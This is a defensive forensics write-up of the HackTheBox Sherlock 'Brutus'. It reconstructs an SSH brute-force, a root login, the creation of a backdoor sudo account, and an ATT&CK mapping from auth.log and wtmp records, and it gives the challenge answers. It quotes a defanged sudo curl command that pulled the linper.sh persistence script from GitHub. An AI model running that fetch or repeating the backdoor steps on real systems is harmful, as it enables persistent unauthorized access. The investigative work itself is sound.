# HTB Sherlock: Brutus

**Source:** HackTheBox Sherlock — [Brutus](https://app.hackthebox.com/sherlocks/Brutus)
**Date:** 2026-07-06

## Overview

A Confluence server's SSH service gets brute-forced, the attacker lands a valid credential, plants a backdoor account with sudo rights, and uses it to pull down a follow-on payload. The evidence is two Linux artifacts — `auth.log` and `wtmp` — and the job is to reconstruct the whole intrusion from them, in order, with timestamps that actually line up.

## Key Concepts

**auth.log vs wtmp — two different records of the same login.** `auth.log` is the plaintext PAM/sshd/sudo log: every authentication attempt, every session open/close, every sudo command, each with its own timestamp. `wtmp` is a binary record that tracks when a login session is actually established — PID, tty, source IP, and a login time. They look like they should say the same thing, but they don't: `auth.log`'s "Accepted password" line is the *authentication* event, while `wtmp`'s login time is the *session establishment* event. On this box those two timestamps differ by a full second (`06:32:44` vs `06:32:45`), which is the kind of gap that matters if you're trying to build a defensible timeline rather than just eyeballing "close enough."

**systemd-logind session numbers as a correlation key.** Every login gets assigned an incrementing session number (`New session N of user X`) by `systemd-logind`, and that same number shows up again on close (`Removed session N`). That's a cleaner way to bound "how long was this attacker actually connected" than trying to pair up open/close lines by eye, especially once a second session (the backdoor account) opens before the first one closes.

**Mapping persistence to ATT&CK isn't just a lookup — it's a scoping decision.** T1136 (Create Account) has sub-techniques for local, domain, and cloud accounts. The log shows a local Linux account created via standard group/user tooling, so the correct sub-technique is T1136.001, not the parent technique. Getting the sub-technique right (not just "some flavor of T1136") is what separates a report that's useful for detection engineering from one that just names the general idea.

## Finding: Brute-Force Source Identification

**Task:** Identify the IP address used to carry out the brute-force attack.

**Answer:** `65.2.161.68`

Scanning `auth.log` for the volume pattern that brute-forcing produces — a wall of `Invalid user` entries within seconds of each other — pointed straight to the source. The line `Mar 6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380` is where the attempts start, with the same source IP repeating through a long run of guessed usernames right after it.

![auth.log open in Notepad++ showing repeated session/cron entries around the attack window](../../images/brutus/Pasted%20image%2020260706165349.png)

## Finding: Successful Authentication

**Task:** Identify the account the brute-force attempts ultimately compromised.

**Answer:** `root`

Two accepted-password lines trace back to the attacker's IP: `root` at `06:32:44` and, later, `cyberjunkie` at `06:37:34`. The second one is the attacker's own backdoor account (created after the first login) rather than a second brute-force win — that becomes clear once the timeline is assembled, not from either line in isolation.

## Finding: Authentication Timestamp vs Session-Establishment Timestamp

**Task:** Find the UTC timestamp when the attacker actually logged in and got a terminal session — distinct from the authentication timestamp.

**Answer:** `2024/03/06 06:32:45`

`auth.log` shows the credential being accepted at `06:32:44`. Running `utmp.py` against the `wtmp` artifact turns up the matching session record one second later, at `06:32:45`, for the same user and source IP. The task exists specifically to force separating these two moments instead of treating "accepted password" as the login time.

## Finding: Session Tracking

**Task:** Identify the session number systemd-logind assigned to the attacker's first login.

**Answer:** `37`

Right after the `root` authentication, `auth.log` records `systemd-logind[411]: New session 37 of user root.` That number becomes the anchor for tracking exactly how long this specific session stayed open, independent of whatever other sessions (cron, the backdoor account) are interleaved in the log around it.

## Finding: Persistence via New Privileged Account

**Task:** Identify the account the attacker created for persistence, and the privilege level given to it.

**Answer:** `cyberjunkie`, added to the `sudo` group

Once inside as `root`, the attacker doesn't just sit on that access — they create a new user (`cyberjunkie`, UID/GID 1002), set its password, and add it to both the `sudo` group and `gshadow`. That's a deliberate fallback: even if the `root` login gets noticed and killed, the attacker keeps a second, less conspicuous door in.

## Finding: MITRE ATT&CK Mapping

**Task:** Identify the ATT&CK sub-technique for this persistence method.

**Answer:** `T1136.001` — Create Account: Local Account

A locally-created OS account, not a domain or cloud identity, so the sub-technique under T1136 is Local Account specifically. Naming the exact sub-technique is what makes this usable for building a detection rule later, rather than just a label for the report.

## Finding: Session Closure

**Task:** Identify when the attacker's first SSH session ended.

**Answer:** `2024-03-06 06:37:24`

Searching `auth.log` for session `37` again turns up its close: `systemd-logind[411]: Removed session 37.` That gives a clean, bounded window for the `root` session — roughly five minutes, `06:32:44` to `06:37:24` — during which the account and persistence mechanism were created.

## Finding: Payload Retrieval via Sudo

**Task:** Identify the sudo command the attacker ran from the backdoor account to pull down a script.

**Answer:** `/usr/bin/curl https[://]raw.githubusercontent[.]com/montysecurity/linper/main/linper.sh`

Filtering `auth.log` for `cyberjunkie` shows the account logging back in (a new session, 49) and, minutes later, using its freshly-granted sudo rights to run a `curl` pull of a public GitHub script. That's the handoff point from "gained persistence" to "used it" — the attacker cashing in the backdoor account for actual follow-on tooling.

## Takeaway

The whole case turns on refusing to collapse two artifacts that look redundant into one. `auth.log` and `wtmp` both seem to say "user X logged in at time Y," but they're recording different moments in the same login — authentication versus session establishment — and treating them as interchangeable would have put the reconstructed timeline a full second off at the exact point where accuracy matters (bounding when the attacker actually had a working shell). The rest of the case is a textbook brute-force-to-persistence chain — credential guessing, a successful login, a backdoor account, a privilege grant, a payload pull — and that pattern is loud enough that any SOC watching auth logs at volume would catch the brute-force phase before the attacker ever got as far as `cyberjunkie`.
